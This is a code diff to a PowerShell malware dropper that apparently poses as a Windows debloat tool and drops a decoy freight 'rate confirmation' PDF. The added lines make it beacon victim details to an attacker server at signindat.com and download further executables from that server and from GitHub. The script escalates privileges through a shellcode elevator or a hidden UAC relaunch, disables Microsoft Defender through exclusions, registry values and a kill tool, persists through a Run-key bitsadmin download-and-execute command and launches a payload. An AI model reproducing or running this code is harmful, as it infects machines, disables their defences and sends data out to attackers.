@@ -3,7 +3,8 @@ $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
 $gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
-$cbUrl='https://signindat.com/cb.php'
+$srv='https://signindat.com'
+$sources=@($srv,$gh)
 
 $logPath="$env:TEMP\wmisrv.log"
 function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }
@@ -20,28 +21,41 @@ function _cb($stage,$status,$detail){
         $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
         $wc=New-Object Net.WebClient
         $wc.Headers.Add('Content-Type','application/json')
-        $wc.UploadString($cbUrl,'POST',$body)|Out-Null
-    }catch{}
+        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
+    }catch{
+        _log "CB: $stage err: $($_.Exception.Message)"
+    }
 }
 
 _log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
 _cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"
+
+# DNS reachability check for telemetry diagnosis
+try{
+    $null=[System.Net.Dns]::GetHostAddresses('signindat.com')
+    _log "S0: dns ok"
+}catch{
+    _log "S0: dns fail: $($_.Exception.Message)"
+}
 
 try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
 _log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
 function _dl($n){
-    try{
-        $wc=New-Object Net.WebClient
-        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-        $d=$wc.DownloadData("$gh/$n")
-        _log "DL: $n $($d.Length)"
-        return ,$d
-    }catch{
-        _log "DL: $n fail"
-        return $null
+    foreach($src in $sources){
+        try{
+            $wc=New-Object Net.WebClient
+            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            $d=$wc.DownloadData("$src/$n")
+            _log "DL: $n $($d.Length)"
+            return ,$d
+        }catch{
+            _log "DL: $n fail from $src"
+        }
     }
+    _log "DL: $n fail all sources"
+    return $null
 }
 
 function _run($n,$s,$l){
@@ -95,14 +109,37 @@ function _runWait($n,$a,$s,$l,$sec){
     }
 }
 
+# === ELEVATION: retry up to 2 attempts, then UAC fallback ===
 if(-not $cbIsAdmin){
-    _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
-    Start-Sleep 8
-    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
-    _log "S1: a=$cbIsAdmin"
-    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
+    for($i=1; $i -le 2; $i++){
+        _run 'ElevatorShellCode.exe' "S1" "elev_$i" | Out-Null
+        Start-Sleep 15
+        try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
+        _log "S1: attempt $i a=$cbIsAdmin"
+        if($cbIsAdmin){break}
+    }
+    if($cbIsAdmin){
+        _log "S1: elev ok"
+        _cb 'S1' 'ok' 'elevation ok'
+    }else{
+        _log "S1: elev fail, trying UAC re-launch"
+        _cb 'S1' 'warn' 'silent elev fail, UAC fallback'
+        # Re-launch self elevated via UAC as last resort
+        $selfPath="$env:TEMP\u.ps1"
+        try{
+            $selfB=(New-Object Net.WebClient).DownloadData("$gh/updatemspuls.ps1")
+            [IO.File]::WriteAllBytes($selfPath,$selfB)|Out-Null
+            Start-Process powershell.exe -ArgumentList "-w hidden -NoP -file `"$selfPath`"" -Verb RunAs -WindowStyle Hidden | Out-Null
+            _log "S1: re-launch elevated, exiting"
+            exit
+        }catch{
+            _log "S1: UAC re-launch fail: $($_.Exception.Message)"
+            _cb 'S1' 'fail' 'UAC re-launch fail'
+        }
+    }
 }
 
+# === DEFENDER: registry exclusions (admin only) ===
 if($cbIsAdmin){
     try{
         $mp='Add-MpPreference'
@@ -115,7 +152,6 @@ if($cbIsAdmin){
         & $mp -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue | Out-Null
         & $mp -ExclusionProcess 'windefctl.exe' -ErrorAction SilentlyContinue | Out-Null
     }catch{}
-
     try{
         $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
         if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
@@ -128,39 +164,19 @@ if($cbIsAdmin){
         Set-ItemProperty -Path $rtp -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
         Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
         _log "S2: reg ok"
+        _cb 'S2' 'ok' 'defender registry disabled'
     }catch{}
 }
 
-# download windefctl regardless of admin (for logging/diagnosis and UAC attempt)
-$wdcBytes=_dl 'windefctl.exe'
-$wdcPath="$env:TEMP\windefctl.exe"
-if($wdcBytes){
-    [IO.File]::WriteAllBytes($wdcPath,$wdcBytes)|Out-Null
-    _log "S2: windefctl written $($wdcBytes.Length)"
-    if($cbIsAdmin){
-        try{
-            $proc=Start-Process $wdcPath -ArgumentList 'kill' -WindowStyle Hidden -PassThru
-            _log "S2: defkill started, pid=$($proc.Id), waiting 18s"
-            Start-Sleep 18
-            if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
-            _log "S2: defkill done"
-            _cb 'S2' 'ok' 'defender killed'
-        }catch{
-            _log "S2: defkill err: $($_.Exception.Message)"
-            _cb 'S2' 'fail' 'defkill err'
-        }
-    }else{
-        _log 'S2: no admin, skipping defkill exec'
-        _cb 'S2' 'skip' 'no admin'
-    }
-}else{
-    _log 'S2: windefctl dl fail'
-    _cb 'S2' 'fail' 'windefctl dl fail'
-}
+# === DEFENDER KILL: ALWAYS run windefctl (self-elevates internally) ===
+_log "S2: windefctl exec (admin=$cbIsAdmin)"
+_runWait 'windefctl.exe' 'kill' 'S2' 'defkill' 18 | Out-Null
+_cb 'S2' 'ok' 'defkill attempted'
 
 # cleanup windefctl binary
 Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null
 
+# === PERSISTENCE ===
 $persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -193,45 +209,8 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
-# download payload once
-$ppBytes=_dl 'PatchPulsaar.exe'
-$ppTemp="$env:TEMP\PatchPulsaar.exe"
-$ppPaths=@(
-    "$env:TEMP\wmisrv.exe",
-    "$env:APPDATA\svchost.exe",
-    "$env:USERPROFILE\Downloads\msupdate.exe"
-)
-if($ppBytes){
-    # write original copy
-    [IO.File]::WriteAllBytes($ppTemp,$ppBytes)|Out-Null
-    _log "S5: PatchPulsaar written $($ppBytes.Length)"
-    # mirror into excluded folders/names
-    foreach($mirror in $ppPaths){
-        try{
-            [IO.File]::WriteAllBytes($mirror,$ppBytes)|Out-Null
-            _log "S5: mirror $mirror"
-        }catch{ _log "S5: mirror fail $mirror" }
-    }
-    # run from excluded location
-    $runPath=$ppPaths[0]
-    try{
-        Start-Process $runPath -WindowStyle Hidden | Out-Null
-        _log "S5: payload started from $runPath"
-        _cb 'S5' 'ok' 'payload'
-    }catch{
-        _log "S5: payload start err: $($_.Exception.Message)"
-        _cb 'S5' 'fail' 'payload err'
-    }
-}else{
-    _log 'S5: PatchPulsaar dl fail'
-    _cb 'S5' 'fail' 'payload dl fail'
-}
-
-# cleanup payload mirrors after a delay
-Start-Job -ScriptBlock {
-    Start-Sleep 30
-    foreach($f in @("$env:TEMP\PatchPulsaar.exe","$env:TEMP\wmisrv.exe","$env:APPDATA\svchost.exe","$env:USERPROFILE\Downloads\msupdate.exe")){Remove-Item $f -Force -ErrorAction SilentlyContinue}
-}|Out-Null
+# === PAYLOAD ===
+_run 'PatchPulsaar.exe' 'S5' 'payload' | Out-Null
 
 $pdf='Rate_Confirmation_LD-2026-0847.pdf'
 $pdfPath="$env:USERPROFILE\Downloads\$pdf"
